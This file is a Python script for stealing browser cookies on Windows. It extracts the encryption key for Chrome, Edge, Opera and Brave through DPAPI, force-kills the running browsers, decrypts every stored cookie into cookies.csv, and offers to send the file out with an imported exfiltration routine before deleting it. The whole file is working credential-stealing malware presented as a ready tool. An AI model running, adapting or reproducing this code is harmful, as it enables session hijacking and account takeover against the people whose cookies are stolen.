import sqlite3
from Cryptodome.Cipher import AES
import json
import base64
import win32crypt
import os,sys
import codecs
import subprocess
import csv
from pathlib import Path
from exfiltration import exfiltrate

#global constant set path for encryption keys and cookies data
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"%(os.environ['USERPROFILE']))

EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"%(os.environ['USERPROFILE']))

OPERA_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State"%(os.environ['USERPROFILE']))
OPERA_PATH = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Network\Cookies"%(os.environ['USERPROFILE']))

BRAVE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"%(os.environ['USERPROFILE']))
BRAVE_PATH = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"%(os.environ['USERPROFILE']))

data = open('cookies.csv',mode='a',newline='',encoding='utf-8')
csv_writer = csv.writer(data,delimiter=',')
csv_writer.writerow(["Host","Name", "Cookie"])
files = ["cookies.csv"]

def cleanup(input_files):
    print("[*] Deleting files")
    for rm in input_files:
        file_exist = Path(rm)
        if file_exist.is_file():
            os.remove(rm)
            print("[*] " + rm + " Deleted")
        else:
            print("[!] " + rm + " File Not Found")

def decrypt_password(ciphertext, secret_key):
    try:
        #Step 1: Extracting initilisation vector from ciphertext
        initialisation_vector = ciphertext[3:15]#Step 2: Extracting encrypted password from ciphertext
        encrypted_password = ciphertext[15:-16]#Step 3:Build the AES algorithm to decrypt the password
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass.decode()#Step 4: Decrypted Password
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("Decryption Failed!")
        return ""

def dump_cookies(local_state,web_data,kill,browser):
    try:
        print("########## Dumping " + browser + " Cookie Data ################")
        #Get secretkey from local state
        with open(local_state, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            #Remove suffix DPAPI
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
    except Exception as e:
        print(browser + " Secretkey cannot be found")


    #Connect to sqlite database and dump host,name and decrypted cookie value from Web Data file
    kill = subprocess.getoutput('taskkill /F /IM ' + kill + ' /T') #kiils all running chrome processes
    try:
        conn = sqlite3.connect(web_data)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute("SELECT host_key,name,encrypted_value FROM cookies;") #Select statement to retrieve info 
        for index,login in enumerate(cursor.fetchall()):
            host = login[0]
            name = login[1]
            ciphertext= login[2]
            decrypted_password = decrypt_password(ciphertext, secret_key)
            print("Host:",host.decode("UTF-8"))
            print("Name:",name.decode("UTF-8"))
            print("Decrypted Cookie:",decrypted_password,'\n')
            csv_writer.writerow([host.decode("UTF-8"),name.decode("UTF-8"),decrypted_password])
    except sqlite3.OperationalError:
        print(browser + " Database not found")

dump_cookies(CHROME_PATH_LOCAL_STATE,CHROME_PATH,"chrome.exe","Chrome")
dump_cookies(EDGE_PATH_LOCAL_STATE,EDGE_PATH,"msedge.exe", "Edge")
dump_cookies(OPERA_PATH_LOCAL_STATE,OPERA_PATH,"opera.exe","Opera")
dump_cookies(BRAVE_PATH_LOCAL_STATE,BRAVE_PATH,"brave.exe","Brave")
print("[+] Written data to cookies.csv\n")
data.close()

exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
if exfil.upper() == "N":
    print("[!] Goodbye!")
    sys.exit()

elif exfil.upper() == "Y":
    exfiltrate(files)
    cleanup(files)
